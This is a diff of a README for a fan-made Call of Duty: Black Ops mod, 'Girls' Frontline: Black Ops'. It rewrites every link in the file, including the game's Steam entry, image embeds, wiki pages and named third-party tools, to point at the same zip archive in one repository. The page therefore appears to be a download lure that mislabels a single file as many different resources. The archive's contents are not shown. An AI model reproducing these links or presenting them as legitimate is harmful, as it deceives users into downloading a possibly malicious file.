@@ -2,38 +2,38 @@
 Girls' Frontline: Black Ops
 
 # Requirements
-[Call of Duty: Black Ops](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip) (Steam - PC)*  
-[Game_Mod](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
+[Call of Duty: Black Ops](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip) (Steam - PC)*  
+[Game_Mod](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)   
 
 # CAST
-![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
-![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
-![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
-![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
-![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
-![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
-![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
-![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
-![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
-![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
-![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
-![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
-![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
-![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
+![](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)
+![](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)
+![](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)
+![](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)
+![](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)
+![](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)
+![](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)
+![](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)
+![](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)
+![](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)
+![](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)
+![](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)
+![](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)
+![](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)
 
 # Wiki
-[How To Use](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
-[Releases](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
-[Gallery](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
-[Known Issues](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
-[Credits](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
+[How To Use](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)   
+[Releases](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)   
+[Gallery](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)   
+[Known Issues](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)   
+[Credits](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)   
 
 # Community Projects
-[Custom Subtitles and Cutscenes](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
-[Custom Voicelines](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
+[Custom Subtitles and Cutscenes](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)   
+[Custom Voicelines](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)   
 
 # Useful links
-[Greyhound](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
-[Bassdrop](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
-[Bo1 full dump](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
-[Developer console](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
+[Greyhound](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)   
+[Bassdrop](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)   
+[Bo1 full dump](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)   
+[Developer console](https://github.com/RandomGuy097/gflbo1/raw/refs/heads/main/mods/gfl/gflbo-v2.6.zip)   
